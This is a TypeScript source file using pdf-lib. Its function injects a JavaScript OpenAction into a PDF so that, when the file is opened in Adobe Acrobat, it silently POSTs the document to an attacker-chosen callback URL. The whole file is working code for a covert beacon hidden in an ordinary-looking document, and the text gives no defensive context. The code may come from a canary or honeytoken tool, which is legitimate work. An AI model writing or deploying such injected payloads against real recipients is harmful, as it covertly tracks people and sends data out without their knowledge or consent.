import { PDFDocument, PDFName, PDFString } from 'pdf-lib'

/**
 * Injects JavaScript into a PDF that silently POSTs to the callback URL when opened in Adobe Acrobat.
 * Uses submitForm OpenAction — only works in Adobe Acrobat (not Chrome/Firefox PDF viewers).
 */
export async function injectPdfPayload(params: {
  pdfBytes: Buffer | Uint8Array
  callbackUrl: string
}): Promise<Buffer> {
  const pdfDoc = await PDFDocument.load(params.pdfBytes)

  const jsScript = `this.submitForm({cURL: "${params.callbackUrl}", cSubmitAs: "PDF"});`

  const jsAction = pdfDoc.context.obj({
    Type: 'Action',
    S: 'JavaScript',
    JS: PDFString.of(jsScript),
  })

  const jsActionRef = pdfDoc.context.register(jsAction)
  pdfDoc.catalog.set(PDFName.of('OpenAction'), jsActionRef)

  const output = await pdfDoc.save()
  return Buffer.from(output)
}
